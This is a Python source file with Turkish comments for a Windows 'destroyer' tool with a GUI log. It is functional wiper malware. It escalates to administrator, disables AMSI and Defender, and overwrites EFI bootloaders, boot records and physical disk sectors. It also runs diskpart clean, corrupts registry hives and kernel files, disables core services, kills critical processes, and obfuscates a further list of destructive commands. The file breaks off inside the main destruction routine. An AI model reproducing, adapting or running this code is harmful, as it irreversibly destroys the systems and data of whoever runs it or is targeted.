import os
import base64
import time
import random
import subprocess
import ctypes
import sys
import zlib
import datetime
import tkinter as tk
from tkinter import scrolledtext
try:
    import win32file
    import win32con
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

# Log dosyası
LOG_FILE = "destroyer_log.txt"

def log_message(window, log_area, message, success=True, operation="Genel"):
    """GUI ve dosyaya log yazar, işlem süresi ve türü ekler."""
    start_time = time.time()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status = "Başarılı" if success else "Hata"
    console_message = f"[{timestamp}] [{operation}] {status}: {message}"
    file_message = f"[{timestamp}] [{operation}] {status}: {message} (Süre: {(time.time() - start_time)*1000:.2f} ms)"
    log_area.insert(tk.END, console_message + "\n")
    log_area.see(tk.END)
    window.update()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(file_message + "\n")

# Otomatik yönetici haklarıyla çalıştırma
def run_as_admin():
    """Kodu yönetici haklarıyla otomatik çalıştırır."""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit(0)

# Yönetici haklarını kontrol et
def is_admin():
    """Yönetici haklarını kontrol eder."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Özel şifreleme
def custom_encrypt(data):
    """Komutları şifreler: zlib -> XOR -> Base64 -> rastgele padding."""
    key = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(100))
    compressed = zlib.compress(data.encode())
    xored = bytes(a ^ b for a, b in zip(compressed, (key.encode() * (len(compressed) // len(key) + 1))[:len(compressed)]))
    fake_data = bytes(random.randint(0, 255) for _ in range(random.randint(80, 160)))
    padded = base64.b64encode(xored + fake_data).decode()
    return padded, key

def custom_decrypt(enc_data, key):
    """Şifrelenmiş komutları çözer: Base64 -> XOR -> zlib."""
    try:
        decoded = base64.b64decode(enc_data)[:-random.randint(80, 160)]
        xored = bytes(a ^ b for a, b in zip(decoded, (key.encode() * (len(decoded) // len(key) + 1))[:len(decoded)]))
        return zlib.decompress(xored).decode()
    except:
        return ""

# AMSI ve Defender Bypass
def amsi_bypass(window, log_area):
    """AMSI ve Defender taramasını beş katmanlı olarak devre dışı bırakır."""
    amsi_commands = [
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true",
        "Set-MpPreference -DisableBehaviorMonitoring $true",
        "Set-MpPreference -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true",
        "Set-MpPreference -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true"
    ]
    for cmd in amsi_commands:
        try:
            enc_cmd, enc_key = custom_encrypt(cmd)
            subprocess.run(['powershell', '-ep', 'bypass', '-c', custom_decrypt(enc_cmd, enc_key)], capture_output=True, timeout=10)
            log_message(window, log_area, f"AMSI/Defender bypass yapıldı: {cmd[:50]}...", operation="AMSI Bypass")
        except (subprocess.SubprocessError, ValueError) as e:
            log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="AMSI Bypass")

# EFI bölümü kontrolü
def check_efi_partition(window, log_area):
    """EFI bölümünün varlığını kontrol eder."""
    try:
        result = subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        if result.returncode == 0:
            subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
            return True
        else:
            log_message(window, log_area, "EFI bölümü bulunamadı, EFI işlemleri atlanıyor", success=False, operation="EFI Kontrol")
            return False
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Kontrol")
        return False

# Sahte bootloader/EFI oluşturma
def create_fake_bootloaders(window, log_area):
    """Sahte bootloader/EFI dosyaları oluşturur."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI bölümü bağlandı: X:", operation="EFI Bootloader")
        fake_bootloader = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
        for path in [
            'X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi',
            'X:\\EFI\\Boot\\bootx64.efi',
            'X:\\EFI\\Boot\\grubx64.efi',
            'X:\\EFI\\Boot\\fake_boot.efi',
            'X:\\Recovery\\WindowsRE\\fake_reagentc.exe'
        ]:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f:
                    f.write(fake_bootloader)
                log_message(window, log_area, f"Sahte bootloader oluşturuldu: {path} (Boyut: {len(fake_bootloader)} bytes)", operation="EFI Bootloader")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Bootloader")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI bölümü ayrıldı: X:", operation="EFI Bootloader")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="EFI Bootloader")

# Sahte EFI değişkenleri (NVRAM taşması)
def create_fake_efi_vars(window, log_area):
    """EFI değişken deposunu devasa sahte veriyle doldurur."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "NVRAM taşması için EFI bölümü bağlandı: X:", operation="NVRAM Taşması")
        for var_file in ['vars.dat', 'fakevar1.dat', 'fakevar2.dat', 'fakevar3.dat', 'fakevar4.dat', 'fakevar5.dat', 'fakevar6.dat', 'fakevar7.dat']:
            try:
                with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                    f.write(data)
                log_message(window, log_area, f"NVRAM taşması dosyası: {var_file} (Boyut: {len(data)} bytes)", operation="NVRAM Taşması")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Taşması")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI bölümü ayrıldı: X:", operation="NVRAM Taşması")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="NVRAM Taşması")

# Firmware’e zarar
def corrupt_firmware_vars(window, log_area):
    """UEFI değişkenlerini ve SPI flash verilerini bozar."""
    try:
        subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
        log_message(window, log_area, "Firmware bozma için EFI bölümü bağlandı: X:", operation="Firmware Bozma")
        for var_file in ['firmware_vars.dat', 'spi_flash.dat', 'uefi_store.dat']:
            try:
                with open(f'X:\\EFI\\Variable\\{var_file}', 'wb') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1048576 * 5))
                    f.write(data)
                log_message(window, log_area, f"Firmware dosyası bozuldu: {var_file} (Boyut: {len(data)} bytes)", operation="Firmware Bozma")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Bozma")
        subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
        log_message(window, log_area, "EFI bölümü ayrıldı: X:", operation="Firmware Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Bozma")

# Sahte firmware güncellemeleri
def create_fake_firmware_updates(window, log_area):
    """Sahte firmware, Intel ME ve SPI flash dosyaları oluşturur."""
    try:
        for path in [
            'C:\\Windows\\System32\\Firmware\\fake_bios_update.bin',
            'C:\\Windows\\System32\\Firmware\\fake_spi_flash.bin',
            'C:\\ProgramData\\FirmwareUpdate\\fake_firmware.rom',
            'C:\\Windows\\System32\\nvram_corrupt.dat',
            'C:\\Windows\\System32\\Intel\\ME\\fake_me.bin'
        ]:
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, 'wb') as f:
                    data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                    f.write(data)
                log_message(window, log_area, f"Sahte firmware dosyası: {path} (Boyut: {len(data)} bytes)", operation="Sahte Firmware")
            except (OSError, PermissionError) as e:
                log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sahte Firmware")
        if check_efi_partition(window, log_area):
            subprocess.run(['mountvol', 'X:', '/s'], capture_output=True, timeout=10)
            log_message(window, log_area, "Sahte firmware için EFI bölümü bağlandı: X:", operation="Sahte Firmware")
            for path in [
                'X:\\EFI\\Firmware\\fake_firmware_update.efi',
                'X:\\EFI\\Firmware\\fake_bios_update.bin',
                'X:\\EFI\\Firmware\\fake_spi_flash.bin'
            ]:
                try:
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, 'wb') as f:
                        data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576 * 15)])
                        f.write(data)
                    log_message(window, log_area, f"Sahte firmware dosyası: {path} (Boyut: {len(data)} bytes)", operation="Sahte Firmware")
                except (OSError, PermissionError) as e:
                    log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sahte Firmware")
            subprocess.run(['mountvol', 'X:', '/d'], capture_output=True, timeout=10)
            log_message(window, log_area, "EFI bölümü ayrıldı: X:", operation="Sahte Firmware")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sahte Firmware")

# Firmware kayıt defteri bozma
def corrupt_firmware_registry(window, log_area):
    """Firmware, BIOS ve NT kayıt defteri anahtarlarını bozar."""
    try:
        for _ in range(5):
            fake_key = f"FakeFirmware{random.randint(1000, 9999)}"
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidFirmware{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte firmware anahtarı eklendi: HKLM\\SYSTEM\\CurrentControlSet\\Control\\FirmwareResources\\{fake_key}", operation="Firmware Kayıt Defteri")
            subprocess.run(['reg', 'add', 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS', '/v', fake_key, '/t', 'REG_SZ', '/d', f'CorruptedBIOS{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte BIOS anahtarı eklendi: HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\{fake_key}", operation="Firmware Kayıt Defteri")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', '/v', fake_key, '/t', 'REG_SZ', '/d', f'CorruptedVersion{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte NT anahtarı eklendi: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\{fake_key}", operation="Firmware Kayıt Defteri")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', '/v', fake_key, '/t', 'REG_SZ', '/d', f'C:\\Windows\\System32\\fake{random.randint(1000, 9999)}.exe', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte Run anahtarı eklendi: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\{fake_key}", operation="Firmware Kayıt Defteri")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Firmware Kayıt Defteri")

# Sahte COM/DCOM nesneleri
def create_fake_com_objects(window, log_area):
    """Sahte COM/DCOM nesneleri ekler."""
    try:
        for _ in range(5):
            fake_clsid = f"{{{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}}}"
            subprocess.run(['reg', 'add', f'HKLM\\SOFTWARE\\Classes\\CLSID\\{fake_clsid}', '/v', 'LocalServerName', '/t', 'REG_SZ', '/d', f'FakeCOM{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte COM nesnesi eklendi: HKLM\\SOFTWARE\\Classes\\CLSID\\{fake_clsid}", operation="COM Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="COM Bozma")

# Sahte önyükleme zinciri
def create_fake_boot_chain(window, log_area):
    """Sahte BCD girdileri ve kaotik önyükleme zinciri oluşturur."""
    try:
        for _ in range(10):
            fake_id = f'{{fakeboot{random.randint(1000, 9999)}}}'
            subprocess.run(['bcdedit', '/create', fake_id, '/d', f'FakeBoot{random.randint(1000, 9999)}', '/application', 'osloader'], capture_output=True, timeout=10)
            subprocess.run(['bcdedit', '/set', fake_id, 'path', '\\EFI\\Boot\\fake_boot.efi'], capture_output=True, timeout=10)
            subprocess.run(['bcdedit', '/set', '{bootmgr}', 'displayorder', fake_id], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte BCD girdisi oluşturuldu: {fake_id}", operation="BCD Bozma")
        subprocess.run(['bcdedit', '/set', '{bootmgr}', 'path', '\\fake_boot.efi'], capture_output=True, timeout=10)
        log_message(window, log_area, "Bootmgr yolu bozuldu: \\fake_boot.efi", operation="BCD Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="BCD Bozma")

# MBR bozma (EFI yoksa)
def corrupt_mbr(window, log_area):
    """MBR’yi rastgele veriyle bozar."""
    if WIN32_AVAILABLE:
        try:
            handle = win32file.CreateFile(
                "\\\\.\\PhysicalDrive0",
                win32con.GENERIC_WRITE,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                None,
                win32con.OPEN_EXISTING,
                0,
                None
            )
            random_data = bytes(random.randint(0, 255) for _ in range(512))
            win32file.WriteFile(handle, random_data, None)
            win32file.CloseHandle(handle)
            log_message(window, log_area, "MBR bozuldu: PhysicalDrive0 (Boyut: 512 bytes)", operation="MBR Bozma")
        except Exception as e:
            log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Bozma")
    try:
        with open('script.txt', 'w') as f:
            f.write('select disk 0\nclean\n')
        subprocess.run(['diskpart', '/s', 'script.txt'], capture_output=True, timeout=30)
        log_message(window, log_area, "MBR diskpart ile sıfırlandı", operation="MBR Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata (diskpart MBR): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="MBR Bozma")

# Disk verilerini bozma
def corrupt_disk_data(window, log_area):
    """Disk sektörlerine ve dosya sistemine rastgele veri yazarak bozulma sağlar."""
    if WIN32_AVAILABLE:
        for drive in ['\\\\.\\PhysicalDrive0', '\\\\.\\PhysicalDrive1', '\\\\.\\PhysicalDrive2', '\\\\.\\PhysicalDrive3', '\\\\.\\PhysicalDrive4', '\\\\.\\PhysicalDrive5', '\\\\.\\PhysicalDrive6', '\\\\.\\PhysicalDrive7']:
            try:
                handle = win32file.CreateFile(
                    drive,
                    win32con.GENERIC_WRITE,
                    win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                    None,
                    win32con.OPEN_EXISTING,
                    0,
                    None
                )
                for _ in range(30 if drive == '\\\\.\\PhysicalDrive0' else 15):
                    win32file.SetFilePointer(handle, random.randint(0, 100000) * 512, win32con.FILE_BEGIN)
                    random_data = bytes(random.randint(0, 255) for _ in range(512 * 3000))
                    win32file.WriteFile(handle, random_data, None)
                    log_message(window, log_area, f"Disk sektörü bozuldu: {drive}, konum {random.randint(0, 100000) * 512} (Boyut: {len(random_data)} bytes)", operation="Disk Bozma")
                if drive == '\\\\.\\PhysicalDrive0':
                    win32file.SetFilePointer(handle, 0, win32con.FILE_BEGIN)
                    random_data = bytes(random.randint(0, 255) for _ in range(512 * 10000))
                    win32file.WriteFile(handle, random_data, None)
                    log_message(window, log_area, f"Diskin ilk 10000 sektörü bozuldu: {drive} (Boyut: {len(random_data)} bytes)", operation="Disk Bozma")
                win32file.CloseHandle(handle)
                break
            except Exception as e:
                log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Disk Bozma")
    try:
        random_file = f"C:\\corrupt_chunk_{random.randint(1000, 9999)}.dat"
        with open(random_file, 'wb') as f:
            data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
            f.write(data)
        log_message(window, log_area, f"Rastgele dosya oluşturuldu: {random_file} (Boyut: {len(data)} bytes)", operation="Disk Bozma")
        subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
        log_message(window, log_area, "Dosya sistemi meta verileri alındı: C:", operation="Dosya Sistemi Bozma")
    except (OSError, PermissionError, subprocess.SubprocessError) as e:
        log_message(window, log_area, f"Hata (dosya sistemi): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Dosya Sistemi Bozma")

# Sistem zamanlayıcılarını ve süreçleri bozma
def corrupt_task_scheduler(window, log_area):
    """Görev zamanlayıcılarını, hizmetleri ve süreçleri devre dışı bırakır."""
    try:
        subprocess.run(['schtasks', '/delete', '/tn', '*', '/f'], capture_output=True, timeout=10)
        log_message(window, log_area, "Tüm görev zamanlayıcıları silindi", operation="Zamanlayıcı Bozma")
        for service in ['Schedule', 'wuauserv', 'TrustedInstaller', 'Winmgmt', 'CryptSvc', 'Spooler', 'EventLog', 'WinRM', 'DcomLaunch', 'SamSs', 'RpcSs', 'PlugPlay']:
            subprocess.run(['sc', 'config', service, 'start=', 'disabled'], capture_output=True, timeout=10)
            subprocess.run(['net', 'stop', service], capture_output=True, timeout=10)
            log_message(window, log_area, f"Hizmet devre dışı: {service}", operation="Zamanlayıcı Bozma")
        for process in ['svchost.exe', 'csrss.exe', 'smss.exe']:
            subprocess.run(['taskkill', '/IM', process, '/F'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Süreç sonlandırıldı: {process}", operation="Süreç Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Zamanlayıcı Bozma")

# Kayıt defteri bozma
def corrupt_registry(window, log_area):
    """Sistem kayıt defteri anahtarlarını bozar."""
    try:
        for _ in range(10):
            fake_key = f"FakeKey{random.randint(1000, 9999)}"
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidData{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte kayıt defteri anahtarı eklendi: HKLM\\SOFTWARE\\Microsoft\\Windows\\{fake_key}", operation="Kayıt Defteri Bozma")
            subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeService{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', f'\\SystemRoot\\System32\\fake{random.randint(1000, 9999)}.sys', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte hizmet eklendi: FakeService{random.randint(1000, 9999)}", operation="Kayıt Defteri Bozma")
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\Setup', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidSetup{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte kayıt defteri anahtarı eklendi: HKLM\\SYSTEM\\Setup\\{fake_key}", operation="Kayıt Defteri Bozma")
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows', '/v', fake_key, '/t', 'REG_SZ', '/d', f'InvalidPolicy{random.randint(1000, 9999)}', '/f'], capture_output=True, timeout=10)
            log_message(window, log_area, f"Sahte kayıt defteri anahtarı eklendi: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\{fake_key}", operation="Kayıt Defteri Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Kayıt Defteri Bozma")

# Sistem dosyalarını bozma
def corrupt_system_files(window, log_area):
    """Kritik sistem dosyalarını bozar."""
    for file_path in [
        'C:\\Windows\\System32\\winload.efi',
        'C:\\Windows\\System32\\bootmgr',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\System32\\config\\SOFTWARE',
        'C:\\Windows\\System32\\config\\RegBack\\SYSTEM',
        'C:\\Windows\\System32\\config\\RegBack\\SOFTWARE',
        'C:\\Windows\\System32\\ntoskrnl.exe',
        'C:\\Windows\\System32\\hal.dll',
        'C:\\Windows\\System32\\drivers\\ntfs.sys',
        'C:\\Windows\\System32\\winlogon.exe',
        'C:\\Windows\\System32\\smss.exe',
        'C:\\Windows\\System32\\drivers\\volmgr.sys'
    ]:
        try:
            if os.path.exists(file_path):
                subprocess.run(['takeown', '/f', file_path], capture_output=True, timeout=10)
                subprocess.run(['icacls', file_path, '/grant', 'Administrators:F'], capture_output=True, timeout=10)
                with open(file_path, 'r+b') as f:
                    data = bytes(random.randint(0, 255) for _ in range(1024))
                    f.write(data)
                log_message(window, log_area, f"Sistem dosyası bozuldu: {file_path} (Boyut: {len(data)} bytes)", operation="Sistem Dosyası Bozma")
            else:
                log_message(window, log_area, f"Dosya bulunamadı, atlandı: {file_path}", success=False, operation="Sistem Dosyası Bozma")
        except (OSError, PermissionError, IOError, subprocess.SubprocessError) as e:
            log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sistem Dosyası Bozma")

# Sahte sürücü oluşturma
def create_fake_driver(window, log_area):
    """Sahte sürücü dosyaları oluşturur."""
    try:
        driver_path = f'C:\\Windows\\System32\\drivers\\fake_driver{random.randint(1000, 9999)}.sys'
        with open(driver_path, 'wb') as f:
            data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(1048576)])
            f.write(data)
        log_message(window, log_area, f"Sahte sürücü oluşturuldu: {driver_path} (Boyut: {len(data)} bytes)", operation="Sahte Sürücü")
        subprocess.run(['reg', 'add', f'HKLM\\SYSTEM\\CurrentControlSet\\Services\\FakeDriver{random.randint(1000, 9999)}', '/v', 'ImagePath', '/t', 'REG_SZ', '/d', driver_path, '/f'], capture_output=True, timeout=10)
        log_message(window, log_area, f"Sahte sürücü hizmeti eklendi: FakeDriver{random.randint(1000, 9999)}", operation="Sahte Sürücü")
    except (OSError, PermissionError, subprocess.SubprocessError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sahte Sürücü")

# Sahte boot.ini ve bootsect.bak oluşturma
def create_fake_boot_files(window, log_area):
    """Sahte boot.ini ve bootsect.bak dosyaları oluşturur."""
    try:
        boot_ini_path = 'C:\\boot.ini'
        with open(boot_ini_path, 'w') as f:
            data = f"[boot loader]\ntimeout=0\ndefault=multi(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition({random.randint(1, 10)})\\WINDOWS=\"Fake Windows {random.randint(1000, 9999)}\" /fastdetect"
            f.write(data)
        log_message(window, log_area, f"Sahte boot.ini oluşturuldu: {boot_ini_path} (Boyut: {len(data.encode())} bytes)", operation="Sahte Boot Dosyaları")
        bootsect_path = 'C:\\bootsect.bak'
        with open(bootsect_path, 'wb') as f:
            data = bytes([0x4D, 0x5A] + [random.randint(0, 255) for _ in range(512)])
            f.write(data)
        log_message(window, log_area, f"Sahte bootsect.bak oluşturuldu: {bootsect_path} (Boyut: {len(data)} bytes)", operation="Sahte Boot Dosyaları")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sahte Boot Dosyaları")

# Sahte Windows Update dosyaları
def create_fake_update_files(window, log_area):
    """Sahte Windows Update dosyaları oluşturur."""
    try:
        update_path = f'C:\\Windows\\SoftwareDistribution\\Download\\fake_update{random.randint(1000, 9999)}.dat'
        with open(update_path, 'wb') as f:
            data = bytes(random.randint(0, 255) for _ in range(1048576 * 15))
            f.write(data)
        log_message(window, log_area, f"Sahte update dosyası oluşturuldu: {update_path} (Boyut: {len(data)} bytes)", operation="Sahte Update")
    except (OSError, PermissionError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Sahte Update")

# Dosya sistemi meta verilerini bozma
def corrupt_filesystem_metadata(window, log_area):
    """Dosya sistemi meta verilerini bozar."""
    try:
        subprocess.run(['fsutil', 'fsinfo', 'ntfsinfo', 'C:'], capture_output=True, timeout=10)
        log_message(window, log_area, "Dosya sistemi meta verileri alındı: C:", operation="Dosya Sistemi Bozma")
        subprocess.run(['fsutil', 'file', 'createnew', f'C:\\fs_corrupt_{random.randint(1000, 9999)}.dat', str(1048576 * 5)], capture_output=True, timeout=10)
        log_message(window, log_area, f"Rastgele dosya sistemi dosyası oluşturuldu: C:\\fs_corrupt_{random.randint(1000, 9999)}.dat (Boyut: 5 MB)", operation="Dosya Sistemi Bozma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata: {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Dosya Sistemi Bozma")

# Otomatik yeniden başlatma
def system_reboot(window, log_area):
    """Sistemi yeniden başlatır."""
    try:
        subprocess.run(['shutdown', '/r', '/t', '0'], capture_output=True, timeout=10)
        log_message(window, log_area, "Sistem yeniden başlatılıyor!", operation="Yeniden Başlatma")
    except (subprocess.SubprocessError, OSError) as e:
        log_message(window, log_area, f"Hata (yeniden başlatma): {str(e)} (WinError: {ctypes.get_last_error()})", success=False, operation="Yeniden Başlatma")

# Dinamik komut mutasyonu
def mutate_command(cmd):
    """Komutları rastgele mutasyona uğratır."""
    mutations = {
        'del': 'erase',
        'format': 'format /y',
        'bcdedit': 'bcdedit.exe',
        'reg delete': 'reg.exe delete',
        'reg add': 'reg.exe add',
        'wmic': 'wmic.exe',
        'schtasks': 'schtasks.exe',
        'sc': 'sc.exe',
        'net': 'net.exe',
        'copy': 'xcopy'
    }
    for old, new in mutations.items():
        if random.random() > 0.85:
            cmd = cmd.replace(old, new)
    return cmd if ' ' in cmd and len(cmd) > 5 else ""

# Polimorfik komutlar
commands = {}
for cmd in [
    'del /f /q X:\\EFI\\\\.*',
    'format X: /fs:fat32 /q /y',
    'format X: /fs:ntfs /q /y',
    'bcdedit /store \\Boot\\BCD /delete {all} /f',
    'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute /f',
    'reagentc /disable',
    'bcdedit /delete {bootmgr} /f',
    'bcdedit /set {globalsettings} safeboot minimal',
    'bcdedit /set {default} recoveryenabled no',
    'bcdedit /set {bootmgr} timeout 0',
    'sc config WinDefend start= disabled',
    'net stop WinDefend',
    'wevtutil cl System',
    'reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /f',
    'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot /v FakeSecureBoot /t REG_SZ /d Invalid /f',
    'echo . | diskpart /s script.txt & echo select disk 0 > script.txt & echo clean all >> script.txt'
]:
    var = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(80))
    enc_cmd, enc_key = custom_encrypt(cmd)
    commands[var] = (enc_cmd, enc_key)

# Ana yıkım fonksiyonu
def start_destruction(window, log_area, status_label):
    """Yıkıcı işlemleri başlatır."""
    status_label.config(text="Durum: Yıkım Başladı!")
    window.update()
    log_message(window, log_area, "Yıkım başladı!", operation="Başlangıç")
    amsi_bypass(window, log_area)
    
    efi_exists = check_efi_partition(window, log_area)
    if efi_exists:
        status_label.config(text="Durum: EFI Bootloader Oluşturuluyor...")
        window.update()
        create_fake_bootloaders(window, log_area)
        status_label.config(text="Durum: NVRAM Taşması Yapılıyor...")
        window.update()
        create_fake_efi_vars(window, log_area)
        status_label.config(text="Durum: Firmware Bozma İşlemi...")
        window.update()
        corrupt_firmware_vars(window, log_area)
    status_label.config(text="Durum: Sahte Firmware Oluşturuluyor...")
    window.update()
    create_fake_firmware_updates(window, log_area)
    status_label.config(text="Durum: Firmware Kayıt Defteri Bozma...")
    window.update()
    corrupt_firmware_registry(window, log_area)
    status_label.config(text="Durum: COM Nesneleri Bozma...")
    window.update()
    create_fake_com_objects(window, log_area)
    status_label.config(text="Durum: Önyükleme Zinciri Bozma...")
    window.update()
    create_fake_boot_chain(window, log_area)
    status_label.config(text="Durum: Hizmetler ve Süreçler Bozma...")
    window.update()
    corrupt_task_scheduler(window, log_area)
    status_label.config(text="Durum: Kayıt Defteri Bozma...")
    window.update()
    corrupt_registry(window, log_area)
    status_label.config(text="Durum: Sistem Dosyaları Bozma...")
    window.update()
    corrupt_system_files(window, log_area)
    status_label.config(text="Durum: Sahte Sürücü Oluşturma...")
    window.update()
    create_fake_driver(window, log_area)
